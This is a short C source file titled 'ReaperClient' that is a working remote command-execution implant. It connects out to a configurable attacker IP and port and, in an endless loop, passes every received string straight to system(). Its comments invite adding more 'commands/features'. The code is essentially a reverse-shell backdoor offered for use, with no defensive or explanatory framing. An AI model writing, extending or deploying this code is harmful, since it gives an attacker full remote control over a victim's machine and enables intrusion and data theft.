#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define HOST "0.0.0.0" // Edit this to your own IP!
#define PORT 1337 // Edit this if you would like!


/*
ReaperClient
Date 08/17/21
Author: 0x1CA3
Note: You can customize this client to support more commands if you would like!
*/


int main(void) {
    int fd;
    char command[5000];
    struct sockaddr_in server;
    
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(HOST);
    server.sin_port = htons(PORT);

    fd = socket(AF_INET, SOCK_STREAM, 0);    
    connect(fd, (struct sockaddr *)&server, sizeof(server));

    while (1) {
        recv(fd, command, sizeof(command), 0); // You can start getting creative and add your own commands/features here! :D
        system(command);
    }
    
    EXIT_SUCCESS;
}